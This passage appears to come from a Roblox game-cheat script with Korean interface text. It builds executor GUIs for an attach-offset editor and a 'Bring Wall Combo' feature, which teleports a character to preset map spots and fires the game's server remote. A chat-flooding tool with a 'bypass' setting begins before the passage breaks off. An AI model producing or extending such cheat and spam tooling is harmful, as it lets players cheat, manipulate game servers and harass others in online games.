		local x2 = position3.X
		local y2 = position3.Y
		local z2 = position3.Z

		if x2 == 0 and position3.X ~= 0 then
			x2 = "1e-1000"
		end

		if y2 == 0 and position3.Y ~= 0 then
			y2 = "1e-1000"
		end

		local v6 = createTextBox(frame14, "X 오프셋", 168, tostring(x2))
		local v7 = createTextBox(frame14, "Y 오프셋", 193, tostring(y2))
		local v8 = createTextBox(frame14, "Z (거리)", 218, tostring(z2))
		local v9 = createTextBox(frame14, "Pitch(X°)", 250, string.format("%.1f", n4))
		local v10 = createTextBox(frame14, "Yaw(Y°)", 275, string.format("%.1f", n5))
		local v11 = createTextBox(frame14, "Roll(Z°)", 300, string.format("%.1f", n6))
		local frame23 = Instance.new("Frame", frame2)
		frame23.Size = UDim2.new(1, -24, 0, 70)
		frame23.Position = UDim2.new(0, 12, 0, 396)
		frame23.BackgroundColor3 = Color3.fromRGB(18, 19, 25)
		frame23.BorderSizePixel = 0
		Instance.new("UICorner", frame23).CornerRadius = UDim.new(0, 8)

		local function fn6()
			local n7 = tonumber(v6.Text) or 0
			local n8 = tonumber(v7.Text) or 0
			local n9 = tonumber(v8.Text) or 0

			if v6.Text == "1e-1000" then
				n7 = 0
			end

			if v7.Text == "1e-1000" then
				n8 = 0
			end

			local cframe = CFrame.new(n7, n8, n9)
			local rad = math.rad
			local cframe2 = CFrame.Angles(math.rad(n4), math.rad(n5), rad(n6))
			getgenv().AttachOffset = cframe * cframe2
		end

		local function fn7(arg3)
			local n7 = math.clamp(n5 / 180 * 90, -90, 90)
			local n8 = math.clamp(-n4 / 90 * 90, -90, 90)
			frame10.Position = UDim2.new(0.5, n7, 0.5, n8)
			local v12 = math.sqrt(n7 ^ 2 + n8 ^ 2)
			local v13 = math.deg(math.atan2(n8, n7))
			frame9.Size = UDim2.new(0, v12, 0, 2)
			frame9.Rotation = v13
			local n9 = math.clamp((n6 + 180) / 360, 0, 1)
			frame13.Position = UDim2.new(n9, 0, 0.5, 0)
			frame12.Size = UDim2.new(n9, 0, 1, 0)
			textLabel3.Text = string.format("Roll (Z축 기울기): %.1f°", n6)
			frame16.Rotation = -n6
			local n10 = math.clamp(n4 / 90 * 26, -26, 26)
			frame16.Position = UDim2.new(0.5, 0, 0.5, n10)
			textLabel6.Text = string.format("Pitch: %+.1f° | Yaw: %+.1f°\nRoll: %+.1f°", n4, n5, n6)

			if arg3 then
				v9.Text = string.format("%.1f", n4)
				v10.Text = string.format("%.1f", n5)
				v11.Text = string.format("%.1f", n6)
			end

			fn6()
		end

		local function createTextButton(text, arg3, arg4, arg5, arg6, arg7)
			local textButton3 = Instance.new("TextButton", frame23)
			textButton3.Size = UDim2.new(0, arg4, 0, 24)
			textButton3.Position = UDim2.new(0, arg3, 0, 6)
			textButton3.BackgroundColor3 = Color3.fromRGB(36, 40, 52)
			textButton3.TextColor3 = Color3.fromRGB(220, 230, 255)
			textButton3.Text = text
			textButton3.Font = Enum.Font.GothamBold
			textButton3.TextSize = 10
			textButton3.BorderSizePixel = 0
			Instance.new("UICorner", textButton3).CornerRadius = UDim.new(0, 4)

			textButton3.MouseButton1Click:Connect(function()
				n4 = arg5
				n5 = arg6
				n6 = arg7
				fn7(true)
			end)

			return textButton3
		end

		createTextButton("정면 0°", 6, 64, 0, 0, 0)
		createTextButton("뒤 180°", 76, 64, 0, 180, 0)
		createTextButton("좌 90°", 146, 64, 0, -90, 0)
		createTextButton("우 90°", 216, 64, 0, 90, 0)
		createTextButton("바닥보기", 286, 68, -90, 0, 0)
		local v12 = createTextButton("0° 리셋", 360, 68, 0, 0, 0)
		v12.BackgroundColor3 = Color3.fromRGB(50, 60, 80)
		v12.TextColor3 = Color3.fromRGB(0, 220, 255)
		local textButton3 = Instance.new("TextButton", frame23)
		textButton3.Size = UDim2.new(0, 160, 0, 28)
		textButton3.Position = UDim2.new(0, 6, 0, 36)
		textButton3.BackgroundColor3 = Color3.fromRGB(180, 80, 40)
		textButton3.TextColor3 = Color3.new(1, 1, 1)
		textButton3.Text = "복구"
		textButton3.Font = Enum.Font.GothamBold
		textButton3.TextSize = 11
		textButton3.BorderSizePixel = 0
		Instance.new("UICorner", textButton3).CornerRadius = UDim.new(0, 4)

		textButton3.MouseButton1Click:Connect(function()
			n4 = v3
			n5 = v4
			n6 = v5
			v6.Text = tostring(x)
			v7.Text = tostring(y)
			v8.Text = tostring(z)
			fn7(true)
			notify("Set Attach", "이전 원래 각도 및 오프셋으로 복원되었습니다.", 2)
		end)

		local textButton4 = Instance.new("TextButton", frame23)
		textButton4.Size = UDim2.new(1, -182, 0, 28)
		textButton4.Position = UDim2.new(0, 174, 0, 36)
		textButton4.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
		textButton4.TextColor3 = Color3.new(1, 1, 1)
		textButton4.Text = "실시간 적용하고있는중... "
		textButton4.Font = Enum.Font.GothamBold
		textButton4.TextSize = 11
		textButton4.BorderSizePixel = 0
		Instance.new("UICorner", textButton4).CornerRadius = UDim.new(0, 4)
		local flag4 = false
		local flag5 = false

		local function fn8(arg3)
			local n7 = frame5.AbsolutePosition + frame5.AbsoluteSize / 2
			local n8 = math.clamp(arg3.Position.X - n7.X, -90, 90)
			local n9 = math.clamp(arg3.Position.Y - n7.Y, -90, 90)
			n5 = n8 / 90 * 180
			n4 = -(n9 / 90) * 90
			fn7(true)
		end

		frame5.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag4 = true
				fn8(input)
			end
		end)

		local function fn9(arg3)
			n6 = math.clamp((arg3.Position.X - frame11.AbsolutePosition.X) / frame11.AbsoluteSize.X, 0, 1) * 360 - 180
			fn7(true)
		end

		frame11.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag5 = true
				fn9(input)
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				if flag4 then
					fn8(input)
				elseif flag5 then
					fn9(input)
				end
			end
		end)

		UserInputService_2.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag4 = false
				flag5 = false
			end
		end)

		v9.FocusLost:Connect(function()
			n4 = tonumber(v9.Text) or n4
			n4 = math.clamp(n4, -90, 90)
			fn7(true)
		end)

		v10.FocusLost:Connect(function()
			n5 = tonumber(v10.Text) or n5
			n5 = math.clamp(n5, -180, 180)
			fn7(true)
		end)

		v11.FocusLost:Connect(function()
			n6 = tonumber(v11.Text) or n6
			n6 = math.clamp(n6, -180, 180)
			fn7(true)
		end)

		v6.FocusLost:Connect(fn6)
		v7.FocusLost:Connect(fn6)
		v8.FocusLost:Connect(fn6)

		textButton4.MouseButton1Click:Connect(function()
			fn6()
			notify("Set Attach", string.format("오프셋 & 각도 적용 완료! Z:%.1f | P:%.0f° Y:%.0f° R:%.0f°", tonumber(v8.Text) or 0, n4, n5, n6), 3)
		end)

		fn7(true)
	end)

	getgenv().BWCBAActive = false
	getgenv().BWCBATPBack = true
	getgenv().BWCBASelectedArea = "Middle"
	local v3 = nil
	local tbl5 = {}
	local flag3 = false

	local tbl6 = {
		["Atomic Slash"] = CFrame.new(-52, 1580, 25250) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		Arena = CFrame.new(-130, 440, -373) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		Baseplate = CFrame.new(-42, 1855, 25227) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Below Baseplate"] = CFrame.new(-42, 1469, 25227) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		Jail = CFrame.new(440, 440, -395) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Jail But Smaller"] = CFrame.new(20, 439, -460) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Bigger Jail"] = CFrame.new(290, 440, 465) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Even Bigger Jail"] = CFrame.new(378, 439, 457) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Dark Domain"] = CFrame.new(-80, 84, 20395) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Death Counter"] = CFrame.new(-66, 29, 20383) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		Middle = CFrame.new(155, 441, 45) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Mountain 1"] = CFrame.new(306, 671, 411) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Mountain 2"] = CFrame.new(-1, 653, -354) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		["Mountain Edge"] = CFrame.new(-297, 594, -336) * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0),
		Void = CFrame.new(169, 218, 102) * CFrame.new(0, 1.5, 0) * CFrame.Angles(1.5707963267948966, 0, 0),
	}

	local function fn4(arg, arg2, arg3, arg4, arg5)
		if flag3 then
			return
		end
		flag3 = true
		local RunService_3 = game:GetService("RunService")
		local bwcbaSelectedArea = getgenv().BWCBASelectedArea or "Middle"
		local middle = arg4 or tbl6[bwcbaSelectedArea] or tbl6.Middle
		local cFrame = middle

		if arg4 or bwcbaSelectedArea == "CustomBring" then
			cFrame = middle * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0)
		end

		local cFrame2 = arg5 or arg2.CFrame
		local cFrame3 = arg2.CFrame * CFrame.new(0, -0.5, 0) * CFrame.Angles(-1.5707963267948966, 0, 0)
		local now = tick()

		local connection2 = RunService_3.RenderStepped:Connect(function()
			pcall(function()
				arg2.AssemblyLinearVelocity = Vector3.zero
				arg2.AssemblyAngularVelocity = Vector3.zero
				arg2.Velocity = Vector3.zero
				arg2.RotVelocity = Vector3.zero
				arg2.CFrame = cFrame3
			end)
		end)

		repeat
			task.wait()
		until now + 0.225 <= tick()

		if connection2 then
			connection2:Disconnect()
		end

		local connection3 = RunService_3.RenderStepped:Connect(function()
			pcall(function()
				arg2.AssemblyLinearVelocity = Vector3.zero
				arg2.AssemblyAngularVelocity = Vector3.zero
				arg2.Velocity = Vector3.zero
				arg2.RotVelocity = Vector3.zero
				arg2.CFrame = cFrame
			end)
		end)

		task.wait(0.2)

		pcall(function()
			if arg:FindFirstChild("Communicate") then
				arg.Communicate:FireServer({ Goal = "Wall Combo" })
			end
		end)

		if connection3 then
			connection3:Disconnect()
		end

		flag3 = false
		task.wait(0.5)

		if getgenv().BWCBATPBack or arg5 then
			pcall(function()
				for _, v4 in pairs(arg3:GetPlayingAnimationTracks()) do
					v4:Stop()
				end

				arg2.AssemblyLinearVelocity = Vector3.zero
				arg2.AssemblyAngularVelocity = Vector3.zero
				arg2.Velocity = Vector3.zero
				arg2.RotVelocity = Vector3.zero

				RunService_3.Heartbeat:Once(function()
					arg2.CFrame = cFrame2
				end)
			end)
		end
	end

	local function fn5(arg)
		if not arg then
			return
		end
		local localPlayer2 = game.Players.LocalPlayer
		local humanoidRootPart3 = arg:FindFirstChild("HumanoidRootPart") or arg:WaitForChild("HumanoidRootPart", 3)
		local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 3)
		if not humanoidRootPart3 or not humanoid then
			return
		end

		tbl5[#tbl5 + 1] = arg.AttributeChanged:Connect(function(attribute)
			if attribute ~= "Combo" then
				return
			end

			if arg:GetAttribute("Combo") ~= 5 then
				return
			end

			if not getgenv().BWCBAActive then
				return
			end

			if flag3 then
				return
			end

			task.spawn(function()
				task.wait()
				local flag4 = false

				pcall(function()
					for _, v4 in pairs(humanoid:GetPlayingAnimationTracks()) do
						if v4.Animation and v4.Animation.AnimationId:match("10470104242") then
							flag4 = true
							break
						end
					end
				end)

				local flag5 = false

				pcall(function()
					local tbl7 = {
						"10469643643",
						"13294471966",
						"17889290569",
						"13295936866",
						"13378708199",
						"14136436157",
						"15162694192",
						"16552234590",
						"17325537719",
						"134775406437626",
						"80601239139774",
					}

					for _, v4 in pairs(humanoid:GetPlayingAnimationTracks()) do
						if v4.Animation then
							local match = v4.Animation.AnimationId:match("%d+") or ""

							for _, v5 in ipairs(tbl7) do
								if match == v5 then
									flag5 = true
									break
								end
							end
						end

						if not flag5 then
							continue
						end
						break
					end
				end)

				if flag5 then
					local str = tostring(localPlayer2:GetAttribute("Character") or ""):lower()

					if (str:find("garou") or str:find("hunter") or str:find("monster") or str:find("child") or str:find("tech")) and Toggles and Toggles.InstantTwisted and Toggles.InstantTwisted.Value then
						flag5 = false
					end
				end

				if not flag4 and not flag5 and not _shouldDoWallCombo() then
					return
				end
				fn4(arg, humanoidRootPart3, humanoid)
			end)
		end)

		tbl5[#tbl5 + 1] = arg.DescendantAdded:Connect(function(descendant)
			if not descendant:IsA("ObjectValue") or descendant.Name:lower() ~= "wallcombo" then
				return
			end

			if not getgenv().BWCBAActive then
				return
			end
		end)
	end

	local function fn6()
		getgenv().BWCBAActive = false
		flag3 = false

		for _, v4 in pairs(tbl5) do
			if v4 then
				v4:Disconnect()
			end
		end

		table.clear(tbl5)

		if v3 then
			pcall(function()
				v3:Destroy()
			end)

			v3 = nil
		end

		delvape("bringwallcomboanywhere")
		notify("Bring Wall Combo", "기능이 꺼지고 UI가 삭제되었습니다 ❌", 2)
	end

	local function getHwid4()
		if v3 then
			pcall(function()
				v3:Destroy()
			end)

			v3 = nil
		end

		local CoreGui = game:GetService("CoreGui")
		local UserInputService_2 = game:GetService("UserInputService")
		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "BWCBA_GUI"
		screenGui2.ResetOnSpawn = false

		pcall(function()
			screenGui2.Parent = CoreGui
		end)

		if not screenGui2.Parent then
			screenGui2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		end

		v3 = screenGui2
		local frame2 = Instance.new("Frame")
		frame2.Name = "MainFrame"
		frame2.Size = UDim2.new(0, 310, 0, 320)
		frame2.Position = UDim2.new(0.5, -155, 0.4, -160)
		frame2.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame2.BorderSizePixel = 0
		frame2.Active = true
		frame2.Parent = screenGui2
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(0, 10)
		uiCorner3.Parent = frame2
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.fromRGB(60, 60, 70)
		uiStroke3.Thickness = 1.5
		uiStroke3.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Name = "TitleBar"
		frame3.Size = UDim2.new(1, 0, 0, 40)
		frame3.BackgroundColor3 = Color3.fromRGB(32, 32, 38)
		frame3.BorderSizePixel = 0
		frame3.Parent = frame2
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 10)
		uiCorner4.Parent = frame3
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, -50, 1, 0)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "Bring Wall Combo"
		textLabel.TextColor3 = Color3.fromRGB(240, 240, 245)
		textLabel.TextSize = 15
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame3
		local textButton2 = Instance.new("TextButton")
		textButton2.Name = "CloseButton"
		textButton2.Size = UDim2.new(0, 30, 0, 30)
		textButton2.Position = UDim2.new(1, -35, 0, 5)
		textButton2.BackgroundColor3 = Color3.fromRGB(220, 50, 60)
		textButton2.Text = "X"
		textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton2.TextSize = 16
		textButton2.Font = Enum.Font.SourceSansBold
		textButton2.Parent = frame3
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 6)
		uiCorner5.Parent = textButton2

		textButton2.MouseButton1Click:Connect(function()
			fn6()
		end)

		local flag4 = nil
		local v4 = nil
		local position = nil
		local position2 = nil

		frame3.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag4 = true
				position = input.Position
				position2 = frame2.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag4 = false
					end
				end)
			end
		end)

		frame3.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				v4 = input
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if input == v4 and flag4 then
				local n = input.Position - position
				frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
			end
		end)

		local textButton3 = Instance.new("TextButton")
		textButton3.Size = UDim2.new(1, -24, 0, 36)
		textButton3.Position = UDim2.new(0, 12, 0, 50)
		textButton3.BackgroundColor3 = getgenv().BWCBAActive and Color3.fromRGB(40, 160, 90) or Color3.fromRGB(50, 50, 60)
		textButton3.Text = getgenv().BWCBAActive and "벽콤 브링 상태: 켜짐 ✅" or "벽콤 브링 상태: 꺼짐 ❌"
		textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton3.TextSize = 14
		textButton3.Font = Enum.Font.SourceSansBold
		textButton3.Parent = frame2
		local uiCorner6 = Instance.new("UICorner")
		uiCorner6.CornerRadius = UDim.new(0, 6)
		uiCorner6.Parent = textButton3

		textButton3.MouseButton1Click:Connect(function()
			getgenv().BWCBAActive = not getgenv().BWCBAActive

			if getgenv().BWCBAActive then
				textButton3.BackgroundColor3 = Color3.fromRGB(40, 160, 90)
				textButton3.Text = "벽콤 브링 상태: 켜짐 ✅"
				addvape("bringwallcomboanywhere")
				notify("Bring Wall Combo", "켜졌습니다 ✅", 2)
			else
				textButton3.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
				textButton3.Text = "벽콤 브링 상태: 꺼짐 ❌"
				delvape("bringwallcomboanywhere")
				notify("Bring Wall Combo", "꺼졌습니다 ❌", 2)
			end
		end)

		local textButton4 = Instance.new("TextButton")
		textButton4.Size = UDim2.new(1, -24, 0, 32)
		textButton4.Position = UDim2.new(0, 12, 0, 94)
		textButton4.BackgroundColor3 = getgenv().BWCBATPBack and Color3.fromRGB(45, 120, 210) or Color3.fromRGB(50, 50, 60)
		textButton4.Text = getgenv().BWCBATPBack and "원래 위치로 TP 복귀: 켜짐 ✅" or "원래 위치로 TP 복귀: 꺼짐 ❌"
		textButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton4.TextSize = 13
		textButton4.Font = Enum.Font.SourceSans
		textButton4.Parent = frame2
		local uiCorner7 = Instance.new("UICorner")
		uiCorner7.CornerRadius = UDim.new(0, 6)
		uiCorner7.Parent = textButton4

		textButton4.MouseButton1Click:Connect(function()
			getgenv().BWCBATPBack = not getgenv().BWCBATPBack

			if getgenv().BWCBATPBack then
				textButton4.BackgroundColor3 = Color3.fromRGB(45, 120, 210)
				textButton4.Text = "원래 위치로 TP 복귀: 켜짐 ✅"
			else
				textButton4.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
				textButton4.Text = "원래 위치로 TP 복귀: 꺼짐 ❌"
			end
		end)

		local textLabel2 = Instance.new("TextLabel")
		textLabel2.Size = UDim2.new(1, -24, 0, 20)
		textLabel2.Position = UDim2.new(0, 12, 0, 134)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "이동 위치 선택 (현재: " .. tostring(getgenv().BWCBASelectedArea) .. ")"
		textLabel2.TextColor3 = Color3.fromRGB(180, 180, 195)
		textLabel2.TextSize = 12
		textLabel2.Font = Enum.Font.SourceSansBold
		textLabel2.TextXAlignment = Enum.TextXAlignment.Left
		textLabel2.Parent = frame2
		local scrollingFrame = Instance.new("ScrollingFrame")
		scrollingFrame.Size = UDim2.new(1, -24, 0, 150)
		scrollingFrame.Position = UDim2.new(0, 12, 0, 158)
		scrollingFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
		scrollingFrame.BorderSizePixel = 0
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 480)
		scrollingFrame.ScrollBarThickness = 5
		scrollingFrame.Parent = frame2
		local uiCorner8 = Instance.new("UICorner")
		uiCorner8.CornerRadius = UDim.new(0, 6)
		uiCorner8.Parent = scrollingFrame
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.Padding = UDim.new(0, 4)
		uiListLayout.Parent = scrollingFrame
		local tbl7 = {}

		for _, v5 in ipairs({
			"Middle",
			"Arena",
			"Baseplate",
			"Below Baseplate",
			"Jail",
			"Jail But Smaller",
			"Bigger Jail",
			"Even Bigger Jail",
			"Dark Domain",
			"Death Counter",
			"Mountain 1",
			"Mountain 2",
			"Mountain Edge",
			"Atomic Slash",
			"Void",
		}) do
			local textButton5 = Instance.new("TextButton")
			textButton5.Size = UDim2.new(1, -8, 0, 28)
			textButton5.BackgroundColor3 = getgenv().BWCBASelectedArea == v5 and Color3.fromRGB(80, 70, 160) or Color3.fromRGB(35, 35, 42)
			textButton5.Text = v5
			textButton5.TextColor3 = Color3.fromRGB(230, 230, 240)
			textButton5.TextSize = 12
			textButton5.Font = Enum.Font.SourceSans
			textButton5.Parent = scrollingFrame
			local uiCorner9 = Instance.new("UICorner")
			uiCorner9.CornerRadius = UDim.new(0, 4)
			uiCorner9.Parent = textButton5
			tbl7[v5] = textButton5

			textButton5.MouseButton1Click:Connect(function()
				getgenv().BWCBASelectedArea = v5
				textLabel2.Text = "이동 위치 선택 (현재: " .. tostring(v5) .. ")"

				for k, v6 in pairs(tbl7) do
					v6.BackgroundColor3 = k == v5 and Color3.fromRGB(80, 70, 160) or Color3.fromRGB(35, 35, 42)
				end

				notify("Bring Wall Combo", "위치 선택: " .. v5, 2)
			end)
		end
	end

	addcmd("bringwallcomboanywhere", { "bwcba" }, function(arg)
		local _getstring = getstring and getstring(1) or arg[1]

		if _getstring and _getstring ~= "" then
			for k in pairs(tbl6) do
				if k:lower():find(_getstring:lower()) then
					getgenv().BWCBASelectedArea = k
					notify("Bring Wall Combo", "위치 설정됨: " .. k, 2)
					break
				end
			end
		end

		getgenv().BWCBAActive = true
		addvape("bringwallcomboanywhere")
		local localPlayer2 = game.Players.LocalPlayer
		local character = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()

		for _, v4 in pairs(tbl5) do
			if v4 then
				v4:Disconnect()
			end
		end

		table.clear(tbl5)

		tbl5[#tbl5 + 1] = localPlayer2.CharacterAdded:Connect(function(character2)
			task.wait(0.1)
			fn5(character2)
		end)

		fn5(character)
		getHwid4()
		notify("Bring Wall Combo", "GUI가 열렸습니다 ✅", 3)
	end)

	addcmd("unbringwallcomboanywhere", { "unbwcba" }, function()
		fn6()
	end)

	local function fn7()
		local tbl7 = {
			last_used = { bypass = true, messages = { { text = "1번", delay = 2 }, { text = "2번", delay = 2 } } },
			presets = {
				["기본 프리셋"] = { bypass = true, messages = { { text = "1번", delay = 2 }, { text = "2번", delay = 2.5 } } },
			},
		}

		local ok, result = pcall(function()
			if readfile and (isfile and isfile("unknown_chatflood_presets.json") or true) then
				return readfile("unknown_chatflood_presets.json")
			end
			return nil
		end)

		if ok and result and result ~= "" then
			local data = nil

			pcall(function()
				data = game:GetService("HttpService"):JSONDecode(result)
			end)

			if data and type(data) == "table" then
				if not data.last_used then
					data.last_used = tbl7.last_used
				end

				if not data.presets then
					data.presets = tbl7.presets
				end

				return data
			end
		end

		return tbl7
	end

	local function fn8(arg)
		pcall(function()
			if writefile then
				local json = game:GetService("HttpService"):JSONEncode(arg)
				writefile("unknown_chatflood_presets.json", json)
			end
		end)
	end

	local v4 = nil
	local flag4 = false

	addcmd("chatflood", {}, function()
		local CoreGui = game:GetService("CoreGui")
		local Players_3 = game:GetService("Players")
		local TextChatService = game:GetService("TextChatService")
		local ReplicatedStorage_ = game:GetService("ReplicatedStorage")
		local UserInputService_2 = game:GetService("UserInputService")
		local localPlayer2 = Players_3.LocalPlayer

		if v4 and v4.Parent then
			v4:Destroy()
			v4 = nil
		end

		flag4 = false

		if delvape then
			delvape("chatflood")
		end

		local v5 = fn7()
		local bypass = v5.last_used and v5.last_used.bypass ~= nil and v5.last_used.bypass or true
		local tbl7 = {}

		if v5.last_used and v5.last_used.messages and #v5.last_used.messages > 0 then
			for _, message in ipairs(v5.last_used.messages) do
				table.insert(tbl7, { text = tostring(message.text or ""), delay = tonumber(message.delay) or 2 })
			end
		else
			table.insert(tbl7, { text = "첫 번째", delay = 2 })
			table.insert(tbl7, { text = "두 번째", delay = 2 })
		end

		local function fn9()
			v5.last_used = { bypass = bypass, messages = tbl7 }
			fn8(v5)
		end

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "UnknownEnhancedChatSpammerUI"
		screenGui2.ResetOnSpawn = false
		screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui2.Parent = gethui and gethui() or CoreGui or localPlayer2 and localPlayer2:WaitForChild("PlayerGui", 3)
		v4 = screenGui2
		local frame2 = Instance.new("Frame")
		frame2.Name = "MainFrame"
		frame2.Size = UDim2.new(0, 370, 0, 450)
		frame2.Position = UDim2.new(0.5, -185, 0.5, -225)
		frame2.BackgroundColor3 = Color3.fromRGB(20, 21, 28)
		frame2.BorderSizePixel = 0
		frame2.ClipsDescendants = true
		frame2.Active = true
		frame2.Parent = screenGui2
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(0, 10)
		uiCorner3.Parent = frame2
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.fromRGB(50, 52, 70)
		uiStroke3.Thickness = 1.4
		uiStroke3.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Name = "TitleBar"
		frame3.Size = UDim2.new(1, 0, 0, 38)
		frame3.BackgroundColor3 = Color3.fromRGB(28, 30, 42)
		frame3.BorderSizePixel = 0
		frame3.Parent = frame2
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 10)
		uiCorner4.Parent = frame3
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "TitleLabel"
		textLabel.Size = UDim2.new(1, -50, 1, 0)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "언노운 근성봇"
		textLabel.TextColor3 = Color3.fromRGB(240, 245, 255)
		textLabel.TextSize = 14
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame3
		local textButton2 = Instance.new("TextButton")
		textButton2.Name = "CloseBtn"
		textButton2.Size = UDim2.new(0, 26, 0, 26)
		textButton2.Position = UDim2.new(1, -32, 0, 6)
		textButton2.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
		textButton2.Text = "X"
		textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton2.TextSize = 13
		textButton2.Font = Enum.Font.GothamBold
		textButton2.BorderSizePixel = 0
		textButton2.Parent = frame3
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 6)
		uiCorner5.Parent = textButton2
		local flag5 = nil
		local position = nil
		local position2 = nil

		frame3.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag5 = true
				position = input.Position
				position2 = frame2.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag5 = false
					end
				end)
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if flag5 and position and position2 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				local n = input.Position - position
				frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
			end
		end)

		local frame4 = Instance.new("Frame")
		frame4.Name = "TopControlBar"
		frame4.Size = UDim2.new(1, -20, 0, 36)
		frame4.Position = UDim2.new(0, 10, 0, 44)
		frame4.BackgroundTransparency = 1
		frame4.Parent = frame2
		local textButton3 = Instance.new("TextButton")
		textButton3.Name = "ToggleBtn"
		textButton3.Size = UDim2.new(0.5, -4, 1, 0)
		textButton3.Position = UDim2.new(0, 0, 0, 0)
		textButton3.BackgroundColor3 = Color3.fromRGB(46, 139, 87)
		textButton3.Text = "근성 시작 (OFF)"
		textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton3.TextSize = 13
		textButton3.Font = Enum.Font.GothamBold
		textButton3.BorderSizePixel = 0
		textButton3.Parent = frame4
		local uiCorner6 = Instance.new("UICorner")
		uiCorner6.CornerRadius = UDim.new(0, 6)
		uiCorner6.Parent = textButton3
		local textButton4 = Instance.new("TextButton")
		textButton4.Name = "AddMsgBtn"
		textButton4.Size = UDim2.new(0.25, -4, 1, 0)
		textButton4.Position = UDim2.new(0.5, 2, 0, 0)
		textButton4.BackgroundColor3 = Color3.fromRGB(60, 80, 150)
		textButton4.Text = "➕ 추가"
		textButton4.TextColor3 = Color3.fromRGB(240, 245, 255)
		textButton4.TextSize = 12
		textButton4.Font = Enum.Font.GothamBold
		textButton4.BorderSizePixel = 0
		textButton4.Parent = frame4
